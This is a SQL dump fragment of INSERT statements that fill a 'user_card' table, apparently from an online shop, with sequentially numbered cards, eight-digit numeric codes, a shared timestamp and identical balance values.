INSERT INTO `ec22703249_user_card` VALUES ('1586', '0', '1', '', '00586', '16237836', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1587', '0', '1', '', '00587', '67841452', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1588', '0', '1', '', '00588', '96591664', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1589', '0', '1', '', '00589', '98973302', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1590', '0', '1', '', '00590', '34215541', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1591', '0', '1', '', '00591', '57938785', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1592', '0', '1', '', '00592', '12718579', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1593', '0', '1', '', '00593', '71863088', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1594', '0', '1', '', '00594', '10693484', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1595', '0', '1', '', '00595', '14680854', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1596', '0', '1', '', '00596', '10121540', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1597', '0', '1', '', '00597', '95556614', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1598', '0', '1', '', '00598', '57901738', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1599', '0', '1', '', '00599', '21854058', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1600', '0', '1', '', '00600', '17176588', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1601', '0', '1', '', '00601', '67522439', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1602', '0', '1', '', '00602', '25061848', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1603', '0', '1', '', '00603', '23958219', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1604', '0', '1', '', '00604', '21998156', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1605', '0', '1', '', '00605', '80595696', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1606', '0', '1', '', '00606', '91272434', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1607', '0', '1', '', '00607', '51516843', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1608', '0', '1', '', '00608', '33627492', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1609', '0', '1', '', '00609', '35070155', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1610', '0', '1', '', '00610', '85500402', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1611', '0', '1', '', '00611', '47199255', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1612', '0', '1', '', '00612', '80445739', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1613', '0', '1', '', '00613', '93672527', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1614', '0', '1', '', '00614', '50416458', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1615', '0', '1', '', '00615', '65057950', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1616', '0', '1', '', '00616', '19994252', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1617', '0', '1', '', '00617', '15768626', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1618', '0', '1', '', '00618', '51331500', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1619', '0', '1', '', '00619', '58216409', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1620', '0', '1', '', '00620', '42082447', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1621', '0', '1', '', '00621', '13613703', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1622', '0', '1', '', '00622', '14438537', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1623', '0', '1', '', '00623', '81983847', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1624', '0', '1', '', '00624', '28502977', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1625', '0', '1', '', '00625', '18527915', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1626', '0', '1', '', '00626', '59789851', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1627', '0', '1', '', '00627', '36527608', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1628', '0', '1', '', '00628', '63929953', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1629', '0', '1', '', '00629', '74720494', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1630', '0', '1', '', '00630', '78973729', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1631', '0', '1', '', '00631', '38780151', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1632', '0', '1', '', '00632', '75323019', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1633', '0', '1', '', '00633', '63643849', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1634', '0', '1', '', '00634', '23536748', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1635', '0', '1', '', '00635', '28273159', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1636', '0', '1', '', '00636', '73104536', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1637', '0', '1', '', '00637', '90372056', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1638', '0', '1', '', '00638', '88346278', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1639', '0', '1', '', '00639', '59523747', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1640', '0', '1', '', '00640', '88930664', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1641', '0', '1', '', '00641', '74519159', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1642', '0', '1', '', '00642', '39776293', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1643', '0', '1', '', '00643', '55188815', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1644', '0', '1', '', '00644', '39076199', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1645', '0', '1', '', '00645', '95682461', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1646', '0', '1', '', '00646', '52582596', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1647', '0', '1', '', '00647', '44480112', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1648', '0', '1', '', '00648', '59833653', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1649', '0', '1', '', '00649', '83558516', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1650', '0', '1', '', '00650', '68150943', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1651', '0', '1', '', '00651', '91218328', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1652', '0', '1', '', '00652', '88545414', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1653', '0', '1', '', '00653', '56688230', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1654', '0', '1', '', '00654', '53962741', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1655', '0', '1', '', '00655', '99089902', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1656', '0', '1', '', '00656', '28670837', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1657', '0', '1', '', '00657', '68929739', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1658', '0', '1', '', '00658', '39917567', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1659', '0', '1', '', '00659', '57209883', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1660', '0', '1', '', '00660', '22215359', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1661', '0', '1', '', '00661', '73690334', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1662', '0', '1', '', '00662', '20164489', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1663', '0', '1', '', '00663', '71077792', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1664', '0', '1', '', '00664', '33451073', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1665', '0', '1', '', '00665', '27943999', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1666', '0', '1', '', '00666', '88367287', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1667', '0', '1', '', '00667', '15181791', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1668', '0', '1', '', '00668', '33995284', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1669', '0', '1', '', '00669', '48522106', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1670', '0', '1', '', '00670', '52619514', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1671', '0', '1', '', '00671', '29469571', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1672', '0', '1', '', '00672', '43751751', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1673', '0', '1', '', '00673', '83743024', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1674', '0', '1', '', '00674', '40871430', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1675', '0', '1', '', '00675', '88595917', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1676', '0', '1', '', '00676', '16580035', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1677', '0', '1', '', '00677', '95520020', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1678', '0', '1', '', '00678', '76710642', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1679', '0', '1', '', '00679', '54815506', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1680', '0', '1', '', '00680', '59006499', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1681', '0', '1', '', '00681', '86675242', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1682', '0', '1', '', '00682', '60872550', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1683', '0', '1', '', '00683', '66330146', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1684', '0', '1', '', '00684', '10310683', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1685', '0', '1', '', '00685', '27482365', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1686', '0', '1', '', '00686', '59840099', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1687', '0', '1', '', '00687', '59434419', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1688', '0', '1', '', '00688', '80418072', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1689', '0', '1', '', '00689', '99457388', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1690', '0', '1', '', '00690', '52451570', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1691', '0', '1', '', '00691', '99302742', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1692', '0', '1', '', '00692', '37227521', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1693', '0', '1', '', '00693', '71429491', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1694', '0', '1', '', '00694', '58913964', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1695', '0', '1', '', '00695', '42903178', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1696', '0', '1', '', '00696', '26952313', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1697', '0', '1', '', '00697', '77890483', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1698', '0', '1', '', '00698', '89578301', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1699', '0', '1', '', '00699', '67509511', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1700', '0', '1', '', '00700', '39786939', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1701', '0', '1', '', '00701', '96179681', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1702', '0', '1', '', '00702', '46175287', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1703', '0', '1', '', '00703', '68431411', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1704', '0', '1', '', '00704', '54364401', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1705', '0', '1', '', '00705', '63318515', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1706', '0', '1', '', '00706', '23293180', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1707', '0', '1', '', '00707', '42340752', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1708', '0', '1', '', '00708', '15361877', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1709', '0', '1', '', '00709', '76363475', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1710', '0', '1', '', '00710', '43010202', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1711', '0', '1', '', '00711', '55694907', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1712', '0', '1', '', '00712', '60896249', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1713', '0', '1', '', '00713', '58680019', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1714', '0', '1', '', '00714', '84716601', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1715', '0', '1', '', '00715', '15644419', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1716', '0', '1', '', '00716', '81327282', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1717', '0', '1', '', '00717', '76090891', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1718', '0', '1', '', '00718', '66552664', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1719', '0', '1', '', '00719', '63979961', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1720', '0', '1', '', '00720', '87431273', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1721', '0', '1', '', '00721', '39249933', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1722', '0', '1', '', '00722', '52429215', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1723', '0', '1', '', '00723', '14765629', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1724', '0', '1', '', '00724', '75160468', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1725', '0', '1', '', '00725', '94588988', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1726', '0', '1', '', '00726', '85362903', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1727', '0', '1', '', '00727', '39316711', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1728', '0', '1', '', '00728', '74769368', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1729', '0', '1', '', '00729', '88717483', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1730', '0', '1', '', '00730', '95154512', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1731', '0', '1', '', '00731', '65594952', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1732', '0', '1', '', '00732', '90161737', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1733', '0', '1', '', '00733', '53529752', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1734', '0', '1', '', '00734', '53381819', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1735', '0', '1', '', '00735', '47301975', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1736', '0', '1', '', '00736', '70835964', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1737', '0', '1', '', '00737', '43471408', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1738', '0', '1', '', '00738', '30646351', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1739', '0', '1', '', '00739', '69459852', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1740', '0', '1', '', '00740', '38135041', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1741', '0', '1', '', '00741', '76047311', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1742', '0', '1', '', '00742', '89619644', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1743', '0', '1', '', '00743', '30632936', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1744', '0', '1', '', '00744', '12052299', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1745', '0', '1', '', '00745', '58688236', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1746', '0', '1', '', '00746', '29285988', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1747', '0', '1', '', '00747', '55251780', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1748', '0', '1', '', '00748', '88655553', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1749', '0', '1', '', '00749', '26796716', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1750', '0', '1', '', '00750', '77320063', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1751', '0', '1', '', '00751', '38284166', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1752', '0', '1', '', '00752', '26926042', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1753', '0', '1', '', '00753', '52187361', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1754', '0', '1', '', '00754', '40436108', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1755', '0', '1', '', '00755', '13872184', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1756', '0', '1', '', '00756', '75090121', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1757', '0', '1', '', '00757', '10453165', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1758', '0', '1', '', '00758', '11796506', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1759', '0', '1', '', '00759', '77177377', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
